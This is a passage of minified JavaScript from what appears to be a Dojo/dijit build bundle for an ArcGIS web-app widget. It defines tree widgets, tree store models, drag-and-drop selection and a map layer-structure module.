this.collapse());h.forEach(b,function(a){a._updateLayout()})},makeExpandable:function(){this.isExpandable=!0;this._setExpando(!1)},setSelected:function(a){this.labelNode.setAttribute("aria-selected",a?"true":"false");f.toggle(this.rowNode,"dijitTreeRowSelected",a)},focus:function(){K.focus(this.focusNode)}});u("dojo-bidi")&&C.extend({_setTextDirAttr:function(a){!a||this.textDir==a&&this._created||(this._set("textDir",a),this.applyTextDir(this.labelNode),h.forEach(this.getChildren(),function(b){b.set("textDir",
a)},this))}});var z=m("dijit.Tree",[F,L,H,G],{baseClass:"dijitTree",store:null,model:null,query:null,label:"",showRoot:!0,childrenAttr:["children"],paths:[],path:[],selectedItems:null,selectedItem:null,openOnClick:!1,openOnDblClick:!1,templateString:O,persist:!1,autoExpand:!1,dndController:Q,dndParams:"onDndDrop itemCreator onDndCancel checkAcceptance checkItemAcceptance dragThreshold betweenThreshold".split(" "),onDndDrop:null,itemCreator:null,onDndCancel:null,checkAcceptance:null,checkItemAcceptance:null,
dragThreshold:5,betweenThreshold:0,_nodePixelIndent:19,_publish:function(a,b){A.publish(this.id,q.mixin({tree:this,event:a},b||{}))},postMixInProperties:function(){this.tree=this;this.autoExpand&&(this.persist=!1);this._itemNodesMap={};!this.cookieName&&this.id&&(this.cookieName=this.id+"SaveStateCookie");this.expandChildrenDeferred=new c;this.pendingCommandsPromise=this.expandChildrenDeferred.promise;this.inherited(arguments)},postCreate:function(){this._initState();var a=this;this.own(g(this.containerNode,
g.selector(".dijitTreeNode",t.enter),function(b){a._onNodeMouseEnter(B.byNode(this),b)}),g(this.containerNode,g.selector(".dijitTreeNode",t.leave),function(b){a._onNodeMouseLeave(B.byNode(this),b)}),g(this.containerNode,g.selector(".dijitTreeRow",D.press),function(b){a._onNodePress(B.getEnclosingWidget(this),b)}),g(this.containerNode,g.selector(".dijitTreeRow",D),function(b){a._onClick(B.getEnclosingWidget(this),b)}),g(this.containerNode,g.selector(".dijitTreeRow","dblclick"),function(b){a._onDblClick(B.getEnclosingWidget(this),
b)}));this.model||this._store2model();this.own(p.after(this.model,"onChange",q.hitch(this,"_onItemChange"),!0),p.after(this.model,"onChildrenChange",q.hitch(this,"_onItemChildrenChange"),!0),p.after(this.model,"onDelete",q.hitch(this,"_onItemDelete"),!0));this.inherited(arguments);if(this.dndController){q.isString(this.dndController)&&(this.dndController=q.getObject(this.dndController));for(var b={},d=0;d<this.dndParams.length;d++)this[this.dndParams[d]]&&(b[this.dndParams[d]]=this[this.dndParams[d]]);
this.dndController=new this.dndController(this,b)}this._load();this.onLoadDeferred=x(this.pendingCommandsPromise);this.onLoadDeferred.then(q.hitch(this,"onLoad"))},_store2model:function(){this._v10Compat=!0;r.deprecated("Tree: from version 2.0, should specify a model object rather than a store/query");var a={id:this.id+"_ForestStoreModel",store:this.store,query:this.query,childrenAttrs:this.childrenAttr};this.params.mayHaveChildren&&(a.mayHaveChildren=q.hitch(this,"mayHaveChildren"));this.params.getItemChildren&&
(a.getChildren=q.hitch(this,function(a,b,d){this.getItemChildren(this._v10Compat&&a===this.model.root?null:a,b,d)}));this.model=new P(a);this.showRoot=!!this.label},onLoad:function(){},_load:function(){this.model.getRoot(q.hitch(this,function(a){var b=this.rootNode=this.tree._createTreeNode({item:a,tree:this,isExpandable:!0,label:this.label||this.getLabel(a),labelType:this.model.labelType||"text",textDir:this.textDir,indent:this.showRoot?0:-1});this.showRoot?(this.domNode.setAttribute("aria-multiselectable",
!this.dndController.singular),this.rootLoadingIndicator.style.display="none"):(b.rowNode.style.display="none",this.domNode.setAttribute("role","presentation"),this.domNode.removeAttribute("aria-expanded"),this.domNode.removeAttribute("aria-multiselectable"),this["aria-label"]?(b.containerNode.setAttribute("aria-label",this["aria-label"]),this.domNode.removeAttribute("aria-label")):this["aria-labelledby"]&&(b.containerNode.setAttribute("aria-labelledby",this["aria-labelledby"]),this.domNode.removeAttribute("aria-labelledby")),
b.labelNode.setAttribute("role","presentation"),b.labelNode.removeAttribute("aria-selected"),b.containerNode.setAttribute("role","tree"),b.containerNode.setAttribute("aria-expanded","true"),b.containerNode.setAttribute("aria-multiselectable",!this.dndController.singular));this.containerNode.appendChild(b.domNode);a=this.model.getIdentity(a);this._itemNodesMap[a]?this._itemNodesMap[a].push(b):this._itemNodesMap[a]=[b];b._updateLayout();this._expandNode(b).then(q.hitch(this,function(){this._destroyed||
(this.rootLoadingIndicator.style.display="none",this.expandChildrenDeferred.resolve(!0))}))}),q.hitch(this,function(a){console.error(this,": error loading root: ",a)}))},getNodesByItem:function(a){if(!a)return[];a=q.isString(a)?a:this.model.getIdentity(a);return[].concat(this._itemNodesMap[a])},_setSelectedItemAttr:function(a){this.set("selectedItems",[a])},_setSelectedItemsAttr:function(a){var b=this;return this.pendingCommandsPromise=this.pendingCommandsPromise.always(q.hitch(this,function(){var d=
h.map(a,function(a){return!a||q.isString(a)?a:b.model.getIdentity(a)}),c=[];h.forEach(d,function(a){c=c.concat(b._itemNodesMap[a]||[])});this.set("selectedNodes",c)}))},_setPathAttr:function(a){return a.length?x(this.set("paths",[a]).then(function(a){return a[0]})):x(this.set("paths",[]).then(function(a){return a[0]}))},_setPathsAttr:function(a){function d(a,b){var e=a.shift(),w=h.filter(b,function(a){return a.getIdentity()==e})[0];if(w)return a.length?c._expandNode(w).then(function(){return d(a,
w.getChildren())}):w;throw new z.PathError("Could not expand path at "+e);}var c=this;return x(this.pendingCommandsPromise=this.pendingCommandsPromise.always(function(){return b(h.map(a,function(a){a=h.map(a,function(a){return a&&q.isObject(a)?c.model.getIdentity(a):a});if(a.length)return d(a,[c.rootNode]);throw new z.PathError("Empty path");}))}).then(function(a){c.set("selectedNodes",a);return c.paths}))},_setSelectedNodeAttr:function(a){this.set("selectedNodes",[a])},_setSelectedNodesAttr:function(a){this.dndController.setSelection(a)},
expandAll:function(){function a(c){return d._expandNode(c).then(function(){var d=h.filter(c.getChildren()||[],function(a){return a.isExpandable});return b(h.map(d,a))})}var d=this;return x(a(this.rootNode))},collapseAll:function(){function a(c){var e=h.filter(c.getChildren()||[],function(a){return a.isExpandable}),e=b(h.map(e,a));return!c.isExpanded||c==d.rootNode&&!d.showRoot?e:e.then(function(){return d._collapseNode(c)})}var d=this;return x(a(this.rootNode))},mayHaveChildren:function(){},getItemChildren:function(){},
getLabel:function(a){return this.model.getLabel(a)},getIconClass:function(a,b){return!a||this.model.mayHaveChildren(a)?b?"dijitFolderOpened":"dijitFolderClosed":"dijitLeaf"},getLabelClass:function(){},getRowClass:function(){},getIconStyle:function(){},getLabelStyle:function(){},getRowStyle:function(){},getTooltip:function(){return""},_onDownArrow:function(a,b){(a=this._getNext(b))&&a.isTreeNode&&this.focusNode(a)},_onUpArrow:function(a,b){if(a=b.getPreviousSibling())for(b=a;b.isExpandable&&b.isExpanded&&
b.hasChildren();)b=b.getChildren(),b=b[b.length-1];else if(a=b.getParent(),this.showRoot||a!==this.rootNode)b=a;b&&b.isTreeNode&&this.focusNode(b)},_onRightArrow:function(a,b){b.isExpandable&&!b.isExpanded?this._expandNode(b):b.hasChildren()&&(b=b.getChildren()[0])&&b.isTreeNode&&this.focusNode(b)},_onLeftArrow:function(a,b){b.isExpandable&&b.isExpanded?this._collapseNode(b):(a=b.getParent())&&a.isTreeNode&&(this.showRoot||a!==this.rootNode)&&this.focusNode(a)},focusLastChild:function(){var a=this._getLast();
a&&a.isTreeNode&&this.focusNode(a)},_getFirst:function(){return this.showRoot?this.rootNode:this.rootNode.getChildren()[0]},_getLast:function(){for(var a=this.rootNode;a.isExpanded;){var b=a.getChildren();if(!b.length)break;a=b[b.length-1]}return a},_getNext:function(a){if(a.isExpandable&&a.isExpanded&&a.hasChildren())return a.getChildren()[0];for(;a&&a.isTreeNode;){var b=a.getNextSibling();if(b)return b;a=a.getParent()}return null},childSelector:".dijitTreeRow",isExpandoNode:function(a,b){return e.isDescendant(a,
b.expandoNode)||e.isDescendant(a,b.expandoNodeText)},_onNodePress:function(a,b){this.focusNode(a)},__click:function(a,b,d,c){var e=this.isExpandoNode(b.target,a);a.isExpandable&&(d||e)?this._onExpandoClick({node:a}):(this._publish("execute",{item:a.item,node:a,evt:b}),this[c](a.item,a,b),this.focusNode(a));b.stopPropagation();b.preventDefault()},_onClick:function(a,b){this.__click(a,b,this.openOnClick,"onClick")},_onDblClick:function(a,b){this.__click(a,b,this.openOnDblClick,"onDblClick")},_onExpandoClick:function(a){a=
a.node;this.focusNode(a);a.isExpanded?this._collapseNode(a):this._expandNode(a)},onClick:function(){},onDblClick:function(){},onOpen:function(){},onClose:function(){},_getNextNode:function(a){r.deprecated(this.declaredClass+"::_getNextNode(node) is deprecated. Use _getNext(node) instead.","","2.0");return this._getNext(a)},_getRootOrFirstNode:function(){r.deprecated(this.declaredClass+"::_getRootOrFirstNode() is deprecated. Use _getFirst() instead.","","2.0");return this._getFirst()},_collapseNode:function(a){a._expandNodeDeferred&&
delete a._expandNodeDeferred;if("Loading"!=a.state&&a.isExpanded){var b=a.collapse();this.onClose(a.item,a);this._state(a,!1);this._startPaint(b);return b}},_expandNode:function(a){if(a._expandNodeDeferred)return a._expandNodeDeferred;var b=this.model,d=a.item,e=this;a._loadDeferred||(a.markProcessing(),a._loadDeferred=new c,b.getChildren(d,function(b){a.unmarkProcessing();a.setChildItems(b).then(function(){a._loadDeferred.resolve(b)})},function(b){console.error(e,": error loading "+a.label+" children: ",
b);a._loadDeferred.reject(b)}));b=a._loadDeferred.then(q.hitch(this,function(){var b=a.expand();this.onOpen(a.item,a);this._state(a,!0);return b}));this._startPaint(b);return b},focusNode:function(a){var b=this.domNode.scrollLeft;this.focusChild(a);this.domNode.scrollLeft=b},_onNodeMouseEnter:function(){},_onNodeMouseLeave:function(){},_onItemChange:function(a){var b=this.model.getIdentity(a);if(b=this._itemNodesMap[b]){var d=this.getLabel(a),c=this.getTooltip(a);h.forEach(b,function(b){b.set({item:a,
label:d,tooltip:c});b._updateItemClasses(a)})}},_onItemChildrenChange:function(a,b){a=this.model.getIdentity(a);(a=this._itemNodesMap[a])&&h.forEach(a,function(a){a.setChildItems(b)})},_onItemDelete:function(a){a=this.model.getIdentity(a);var b=this._itemNodesMap[a];b&&(h.forEach(b,function(a){this.dndController.removeTreeNode(a);var b=a.getParent();b&&b.removeChild(a);this.lastFocusedChild&&!e.isDescendant(this.lastFocusedChild.domNode,this.domNode)&&delete this.lastFocusedChild;this.focusedChild&&
!e.isDescendant(this.focusedChild.domNode,this.domNode)&&this.focus();a.destroyRecursive()},this),delete this._itemNodesMap[a])},_initState:function(){this._openedNodes={};if(this.persist&&this.cookieName){var a=n(this.cookieName);a&&h.forEach(a.split(","),function(a){this._openedNodes[a]=!0},this)}},_state:function(a,b){if(!this.persist)return!1;var d=h.map(a.getTreePath(),function(a){return this.model.getIdentity(a)},this).join("/");if(1===arguments.length)return this._openedNodes[d];b?this._openedNodes[d]=
!0:delete this._openedNodes[d];this._saveExpandedNodes()},_saveExpandedNodes:function(){if(this.persist&&this.cookieName){var a=[],b;for(b in this._openedNodes)a.push(b);n(this.cookieName,a.join(","),{expires:365})}},destroy:function(){this._curSearch&&(this._curSearch.timer.remove(),delete this._curSearch);this.rootNode&&this.rootNode.destroyRecursive();this.dndController&&!q.isString(this.dndController)&&this.dndController.destroy();this.rootNode=null;this.inherited(arguments)},destroyRecursive:function(){this.destroy()},
resize:function(b){b&&a.setMarginBox(this.domNode,b);this._nodePixelIndent=a.position(this.tree.indentDetector).w||this._nodePixelIndent;this.expandChildrenDeferred.then(q.hitch(this,function(){this.rootNode.set("indent",this.showRoot?0:-1);this._adjustWidths()}))},_outstandingPaintOperations:0,_startPaint:function(a){this._outstandingPaintOperations++;this._adjustWidthsTimer&&(this._adjustWidthsTimer.remove(),delete this._adjustWidthsTimer);var b=q.hitch(this,function(){this._outstandingPaintOperations--;
0>=this._outstandingPaintOperations&&!this._adjustWidthsTimer&&this._started&&(this._adjustWidthsTimer=this.defer("_adjustWidths"))});J(a,b,b)},_adjustWidths:function(){this._adjustWidthsTimer&&(this._adjustWidthsTimer.remove(),delete this._adjustWidthsTimer);this.containerNode.style.width="auto";this.containerNode.style.width=this.domNode.scrollWidth>this.domNode.offsetWidth?"auto":"100%"},_createTreeNode:function(a){return new C(a)},focus:function(){this.lastFocusedChild?this.focusNode(this.lastFocusedChild):
this.focusFirstChild()}});u("dojo-bidi")&&z.extend({_setTextDirAttr:function(a){a&&this.textDir!=a&&(this._set("textDir",a),this.rootNode.set("textDir",a))}});z.PathError=k("TreePathError");z._TreeNode=C;return z})},"dijit/tree/TreeStoreModel":function(){define(["dojo/_base/array","dojo/aspect","dojo/_base/declare","dojo/_base/lang"],function(h,p,n,m){return n("dijit.tree.TreeStoreModel",null,{store:null,childrenAttrs:["children"],newItemIdAttr:"id",labelAttr:"",root:null,query:null,deferItemLoadingUntilExpand:!1,
constructor:function(c){m.mixin(this,c);this.connects=[];c=this.store;if(!c.getFeatures()["dojo.data.api.Identity"])throw Error("dijit.tree.TreeStoreModel: store must support dojo.data.Identity");c.getFeatures()["dojo.data.api.Notification"]&&(this.connects=this.connects.concat([p.after(c,"onNew",m.hitch(this,"onNewItem"),!0),p.after(c,"onDelete",m.hitch(this,"onDeleteItem"),!0),p.after(c,"onSet",m.hitch(this,"onSetItem"),!0)]))},destroy:function(){for(var c;c=this.connects.pop();)c.remove()},getRoot:function(c,
b){this.root?c(this.root):this.store.fetch({query:this.query,onComplete:m.hitch(this,function(b){if(1!=b.length)throw Error("dijit.tree.TreeStoreModel: root query returned "+b.length+" items, but must return exactly one");this.root=b[0];c(this.root)}),onError:b})},mayHaveChildren:function(c){return h.some(this.childrenAttrs,function(b){return this.store.hasAttribute(c,b)},this)},getChildren:function(c,b,e){var f=this.store;if(f.isItemLoaded(c)){for(var a=[],l=0;l<this.childrenAttrs.length;l++)var k=
f.getValues(c,this.childrenAttrs[l]),a=a.concat(k);var d=0;this.deferItemLoadingUntilExpand||h.forEach(a,function(a){f.isItemLoaded(a)||d++});0==d?b(a):h.forEach(a,function(c,l){f.isItemLoaded(c)||f.loadItem({item:c,onItem:function(c){a[l]=c;0==--d&&b(a)},onError:e})})}else{var u=m.hitch(this,arguments.callee);f.loadItem({item:c,onItem:function(a){u(a,b,e)},onError:e})}},isItem:function(c){return this.store.isItem(c)},fetchItemByIdentity:function(c){this.store.fetchItemByIdentity(c)},getIdentity:function(c){return this.store.getIdentity(c)},
getLabel:function(c){return this.labelAttr?this.store.getValue(c,this.labelAttr):this.store.getLabel(c)},newItem:function(c,b,e){var f={parent:b,attribute:this.childrenAttrs[0]},a;this.newItemIdAttr&&c[this.newItemIdAttr]?this.fetchItemByIdentity({identity:c[this.newItemIdAttr],scope:this,onItem:function(l){l?this.pasteItem(l,null,b,!0,e):(a=this.store.newItem(c,f))&&void 0!=e&&this.pasteItem(a,b,b,!1,e)}}):(a=this.store.newItem(c,f))&&void 0!=e&&this.pasteItem(a,b,b,!1,e)},pasteItem:function(c,b,
e,f,a){var l=this.store,k=this.childrenAttrs[0];b&&h.forEach(this.childrenAttrs,function(a){if(l.containsValue(b,a,c)){if(!f){var d=h.filter(l.getValues(b,a),function(a){return a!=c});l.setValues(b,a,d)}k=a}});if(e)if("number"==typeof a){var d=l.getValues(e,k).slice();d.splice(a,0,c);l.setValues(e,k,d)}else l.setValues(e,k,l.getValues(e,k).concat(c))},onChange:function(){},onChildrenChange:function(){},onDelete:function(){},onNewItem:function(c,b){b&&this.getChildren(b.item,m.hitch(this,function(c){this.onChildrenChange(b.item,
c)}))},onDeleteItem:function(c){this.onDelete(c)},onSetItem:function(c,b){if(-1!=h.indexOf(this.childrenAttrs,b))this.getChildren(c,m.hitch(this,function(b){this.onChildrenChange(c,b)}));else this.onChange(c)}})})},"dijit/tree/ForestStoreModel":function(){define(["dojo/_base/array","dojo/_base/declare","dojo/_base/kernel","dojo/_base/lang","./TreeStoreModel"],function(h,p,n,m,c){return p("dijit.tree.ForestStoreModel",c,{rootId:"$root$",rootLabel:"ROOT",query:null,constructor:function(b){this.root=
{store:this,root:!0,id:b.rootId,label:b.rootLabel,children:b.rootChildren}},mayHaveChildren:function(b){return b===this.root||this.inherited(arguments)},getChildren:function(b,c,f){b===this.root?this.root.children?c(this.root.children):this.store.fetch({query:this.query,onComplete:m.hitch(this,function(a){this.root.children=a;c(a)}),onError:f}):this.inherited(arguments)},isItem:function(b){return b===this.root?!0:this.inherited(arguments)},fetchItemByIdentity:function(b){if(b.identity==this.root.id){var c=
b.scope||n.global;b.onItem&&b.onItem.call(c,this.root)}else this.inherited(arguments)},getIdentity:function(b){return b===this.root?this.root.id:this.inherited(arguments)},getLabel:function(b){return b===this.root?this.root.label:this.inherited(arguments)},newItem:function(b,c,f){return c===this.root?(this.onNewRootItem(b),this.store.newItem(b)):this.inherited(arguments)},onNewRootItem:function(){},pasteItem:function(b,c,f,a,l){if(c===this.root&&!a)this.onLeaveRoot(b);this.inherited(arguments,[b,
c===this.root?null:c,f===this.root?null:f,a,l]);if(f===this.root)this.onAddToRoot(b)},onAddToRoot:function(b){console.log(this,": item ",b," added to root")},onLeaveRoot:function(b){console.log(this,": item ",b," removed from root")},_requeryTop:function(){var b=this.root.children||[];this.store.fetch({query:this.query,onComplete:m.hitch(this,function(c){this.root.children=c;if(b.length!=c.length||h.some(b,function(b,a){return c[a]!=b}))this.onChildrenChange(this.root,c)})})},onNewItem:function(b,
c){this._requeryTop();this.inherited(arguments)},onDeleteItem:function(b){-1!=h.indexOf(this.root.children,b)&&this._requeryTop();this.inherited(arguments)},onSetItem:function(b,c,f,a){this._requeryTop();this.inherited(arguments)}})})},"dijit/tree/_dndSelector":function(){define("dojo/_base/array dojo/_base/declare dojo/_base/kernel dojo/_base/lang dojo/dnd/common dojo/dom dojo/mouse dojo/on dojo/touch ../a11yclick ./_dndContainer".split(" "),function(h,p,n,m,c,b,e,f,a,l,k){return p("dijit.tree._dndSelector",
k,{constructor:function(){this.selection={};this.anchor=null;this.events.push(f(this.tree.domNode,a.press,m.hitch(this,"onMouseDown")),f(this.tree.domNode,a.release,m.hitch(this,"onMouseUp")),f(this.tree.domNode,a.move,m.hitch(this,"onMouseMove")),f(this.tree.domNode,l.press,m.hitch(this,"onClickPress")),f(this.tree.domNode,l.release,m.hitch(this,"onClickRelease")))},singular:!1,getSelectedTreeNodes:function(){var a=[],b=this.selection,c;for(c in b)a.push(b[c]);return a},selectNone:function(){this.setSelection([]);
return this},destroy:function(){this.inherited(arguments);this.selection=this.anchor=null},addTreeNode:function(a,b){this.setSelection(this.getSelectedTreeNodes().concat([a]));b&&(this.anchor=a);return a},removeTreeNode:function(a){var d=h.filter(this.getSelectedTreeNodes(),function(d){return!b.isDescendant(d.domNode,a.domNode)});this.setSelection(d);return a},isTreeNodeSelected:function(a){return a.id&&!!this.selection[a.id]},setSelection:function(a){var b=this.getSelectedTreeNodes();h.forEach(this._setDifference(b,
a),m.hitch(this,function(a){a.setSelected(!1);this.anchor==a&&delete this.anchor;delete this.selection[a.id]}));h.forEach(this._setDifference(a,b),m.hitch(this,function(a){a.setSelected(!0);this.selection[a.id]=a}));this._updateSelectionProperties()},_setDifference:function(a,b){h.forEach(b,function(a){a.__exclude__=!0});a=h.filter(a,function(a){return!a.__exclude__});h.forEach(b,function(a){delete a.__exclude__});return a},_updateSelectionProperties:function(){var a=this.getSelectedTreeNodes(),b=
[],c=[];h.forEach(a,function(a){var d=a.getTreePath();c.push(a);b.push(d)},this);a=h.map(c,function(a){return a.item});this.tree._set("paths",b);this.tree._set("path",b[0]||[]);this.tree._set("selectedNodes",c);this.tree._set("selectedNode",c[0]||null);this.tree._set("selectedItems",a);this.tree._set("selectedItem",a[0]||null)},onClickPress:function(a){if(!(this.current&&this.current.isExpandable&&this.tree.isExpandoNode(a.target,this.current))){"mousedown"==a.type&&e.isLeft(a)&&a.preventDefault();
var b="keydown"==a.type?this.tree.focusedChild:this.current;if(b){var d=c.getCopyKeyState(a),f=b.id;this.singular||a.shiftKey||!this.selection[f]?(this._doDeselect=!1,this.userSelect(b,d,a.shiftKey)):this._doDeselect=!0}}},onClickRelease:function(a){this._doDeselect&&(this._doDeselect=!1,this.userSelect("keyup"==a.type?this.tree.focusedChild:this.current,c.getCopyKeyState(a),a.shiftKey))},onMouseMove:function(){this._doDeselect=!1},onMouseDown:function(){},onMouseUp:function(){},_compareNodes:function(a,
b){if(a===b)return 0;if("sourceIndex"in document.documentElement)return a.sourceIndex-b.sourceIndex;if("compareDocumentPosition"in document.documentElement)return a.compareDocumentPosition(b)&2?1:-1;if(document.createRange){var d=doc.createRange();d.setStartBefore(a);a=doc.createRange();a.setStartBefore(b);return d.compareBoundaryPoints(d.END_TO_END,a)}throw Error("dijit.tree._compareNodes don't know how to compare two different nodes in this browser");},userSelect:function(a,b,c){if(this.singular)this.anchor==
a&&b?this.selectNone():(this.setSelection([a]),this.anchor=a);else if(c&&this.anchor){b=this._compareNodes(this.anchor.rowNode,a.rowNode);c=this.anchor;0>b?b=c:(b=a,a=c);for(c=[];b!=a;)c.push(b),b=this.tree._getNext(b);c.push(a);this.setSelection(c)}else this.selection[a.id]&&b?this.removeTreeNode(a):b?this.addTreeNode(a,!0):(this.setSelection([a]),this.anchor=a)},getItem:function(a){return{data:this.selection[a],type:["treeNode"]}},forInSelectedItems:function(a,b){b=b||n.global;for(var d in this.selection)a.call(b,
this.getItem(d),d,this)}})})},"dijit/tree/_dndContainer":function(){define("dojo/aspect dojo/_base/declare dojo/dom-class dojo/_base/lang dojo/on dojo/touch".split(" "),function(h,p,n,m,c,b){return p("dijit.tree._dndContainer",null,{constructor:function(e,f){this.tree=e;this.node=e.domNode;m.mixin(this,f);this.containerState="";n.add(this.node,"dojoDndContainer");this.events=[c(this.node,b.enter,m.hitch(this,"onOverEvent")),c(this.node,b.leave,m.hitch(this,"onOutEvent")),h.after(this.tree,"_onNodeMouseEnter",
m.hitch(this,"onMouseOver"),!0),h.after(this.tree,"_onNodeMouseLeave",m.hitch(this,"onMouseOut"),!0),c(this.node,"dragstart, selectstart",function(a){a.preventDefault()})]},destroy:function(){for(var b;b=this.events.pop();)b.remove();this.node=this.parent=null},onMouseOver:function(b){this.current=b},onMouseOut:function(){this.current=null},_changeState:function(b,c){var a="dojoDnd"+b;b=b.toLowerCase()+"State";n.replace(this.node,a+c,a+this[b]);this[b]=c},_addItemClass:function(b,c){n.add(b,"dojoDndItem"+
c)},_removeItemClass:function(b,c){n.remove(b,"dojoDndItem"+c)},onOverEvent:function(){this._changeState("Container","Over")},onOutEvent:function(){this._changeState("Container","")}})})},"jimu/LayerStructure":function(){define("dojo/_base/declare dojo/_base/array dojo/_base/lang dojo/on dojo/Evented ./LayerInfos/LayerInfos".split(" "),function(h,p,n,m,c,b){var e=h([c],{declaredClass:"jimu.LayerStructure",map:null,_layerInfos:null,_eventHandles:null,constructor:function(a){this._layerInfos=a;this.map=
this._layerInfos.map;this._eventHandles=[];this._bindEvents()},getLayerNodes:function(){return this._getNodesArrayFromInfosArray(this._layerInfos.getLayerInfoArray())},getTableNodes:function(){return this._getNodesArrayFromInfosArray(this._layerInfos.getTableInfoArray())},getWebmapLayerNodes:function(){return this._getNodesArrayFromInfosArray(this._layerInfos.getLayerInfoArrayOfWebmap())},getWebmapTableNodes:function(){return this._getNodesArrayFromInfosArray(this._layerInfos.getTableInfoArrayOfWebmap())},
addTable:function(a){var b=null;if(a=this._layerInfos.addTable(a))b=a._adaptor;return b},removeTable:function(a){(a=this.getNodeById(a))&&this._layerInfos.removeTable(a._layerInfo)},_traversal:function(a,b){for(var c=0;c<b.length;c++)if(b[c].traversal(a))return!0;return!1},traversal:function(a){return this._traversal(a,this.getLayerNodes().concat(this.getTableNodes()))},traversalWithNodes:function(a,b){return this._traversal(a,b)},getNodeById:function(a){var b=null;this.traversal(function(c){if(c.id===
a)return b=c,!0});return b},getBasemapLayerObjects:function(){return this._layerInfos.getBasemapLayers()},restoreState:function(a){this._layerInfos.restoreState(a)},destroy:function(){p.forEach(this._eventHandles,function(a){a.remove()});this.inherited(arguments)},_getNodesArrayFromInfosArray:function(a){var b=[];p.forEach(a,function(a){b.push(a._adaptor)},this);return b},_emitEvent:function(){try{this.emit.apply(this,arguments)}catch(a){console.warn(a)}},_bindEvents:function(){var a;a=m(this._layerInfos,
"layerInfosChanged",n.hitch(this,this._onLayerNodesStructureChanged));this._eventHandles.push(a);a=m(this._layerInfos,"tableInfosChanged",n.hitch(this,this._onTableNdoesStructureChanged));this._eventHandles.push(a);a=m(this._layerInfos,"layerInfosReorder",n.hitch(this,this._onLayerReordered));this._eventHandles.push(a);a=m(this._layerInfos,"layerInfosIsShowInMapChanged",n.hitch(this,this._onVisibilityChanged));this._eventHandles.push(a);a=m(this._layerInfos,"layerInfosIsVisibleChanged",n.hitch(this,
this._onToggleChanged));this._eventHandles.push(a);a=m(this._layerInfos,"layerInfosFilterChanged",n.hitch(this,this._onFilterChanged));this._eventHandles.push(a);a=m(this._layerInfos,"layerInfosRendererChanged",n.hitch(this,this._onRendererChanged));this._eventHandles.push(a);a=m(this._layerInfos,"layerInfosOpacityChanged",n.hitch(this,this._onOpacityChanged));this._eventHandles.push(a)},_onLayerNodesStructureChanged:function(a,b,c){this._emitEvent(e.EVENT_STRUCTURE_CHANGE,{type:b,layerNodes:[c._adaptor],
rootLayerNodes:[a._adaptor]})},_onTableNdoesStructureChanged:function(a,b){a=this._getNodesArrayFromInfosArray(a);this._emitEvent(e.EVENT_STRUCTURE_CHANGE,{type:b,layerNodes:a,rootLayerNodes:a})},_onLayerReordered:function(a,b){a=[a._adaptor];this._emitEvent(e.EVENT_STRUCTURE_CHANGE,{type:b,layerNodes:a,rootLayerNodes:a})},_onVisibilityChanged:function(a){a={layerNodes:this._getNodesArrayFromInfosArray(a)};this._emitEvent(e.EVENT_VISIBILITY_CHANGE,a)},_onToggleChanged:function(a){a={layerNodes:this._getNodesArrayFromInfosArray(a)};
this._emitEvent(e.EVENT_TOOGLE_CHANGE,a)},_onFilterChanged:function(a){a={layerNodes:this._getNodesArrayFromInfosArray(a)};this._emitEvent(e.EVENT_FILTER_CHANGE,a)},_onRendererChanged:function(a){a={layerNodes:this._getNodesArrayFromInfosArray(a)};this._emitEvent(e.EVENT_RENDERER_CHANGE,a)},_onOpacityChanged:function(a){a={layerNodes:this._getNodesArrayFromInfosArray(a)};this._emitEvent(e.EVENT_OPACITY_CHANGE,a)}}),f=null;e.getInstance=function(){f&&f._layerInfos._objectId===b.getInstanceSync()._objectId||
(f&&f.destroy(),f=new e(b.getInstanceSync()));return f};e.createInstance=function(a){return new e(b.createInstance(a))};n.mixin(e,{STRUCTURE_CHANGE_ADD:b.ADDED,STRUCTURE_CHANGE_REMOVE:b.REMOVED,STRUCTURE_CHANGE_SUBNODE_ADD:b.SUBLAYER_ADDED,STRUCTURE_CHANGE_SUBNODE_REMOVE:b.SUBLAYER_REMOVED,STRUCTURE_CHANGE_NODE_UPDATE:b.UPDATED,STRUCTURE_CHANGE_REORDER:b.REORDERED,EVENT_STRUCTURE_CHANGE:"structure-change",EVENT_TOOGLE_CHANGE:"toggle-change",EVENT_VISIBILITY_CHANGE:"visibility-change",EVENT_FILTER_CHANGE:"filter-change",
EVENT_RENDERER_CHANGE:"renderer-change",EVENT_OPACITY_CHANGE:"opacity-change"});return e})},"widgets/Swipe/setting/_build-generate_module":function(){define(["dojo/text!./Setting.html","dojo/text!./css/style.css","dojo/i18n!./nls/strings"],function(){})},"url:jimu/dijit/templates/_TreeNode.html":'\x3cdiv class\x3d"dijitTreeNode" role\x3d"presentation"\x3e\r\n\t\x3cdiv data-dojo-attach-point\x3d"rowNode" class\x3d"dijitTreeRow" role\x3d"presentation"\x3e\r\n\t\t\x3cspan data-dojo-attach-point\x3d"expandoNode" class\x3d"dijitInline dijitTreeExpando" role\x3d"presentation"\x3e\x3c/span\x3e\r\n\t\t\x3cspan data-dojo-attach-point\x3d"expandoNodeText" class\x3d"dijitExpandoText" role\x3d"presentation"\x3e\x3c/span\x3e\r\n\t\t\x3cspan data-dojo-attach-point\x3d"contentNode" class\x3d"dijitTreeContent" role\x3d"presentation"\x3e\r\n\t\t\t\x3cspan role\x3d"presentation" class\x3d"dijitInline dijitIcon dijitTreeIcon" data-dojo-attach-point\x3d"iconNode"\x3e\x3c/span\x3e\r\n\t\t\t\x3cspan data-dojo-attach-point\x3d"labelNode,focusNode" class\x3d"dijitTreeLabel" role\x3d"treeitem" tabindex\x3d"-1" aria-selected\x3d"false"\x3e\x3c/span\x3e\r\n\t\t\x3c/span\x3e\r\n\t\x3c/div\x3e\r\n\t\x3cdiv data-dojo-attach-point\x3d"containerNode" class\x3d"dijitTreeNodeContainer" role\x3d"presentation" style\x3d"display: none;"\x3e\x3c/div\x3e\r\n\x3c/div\x3e',
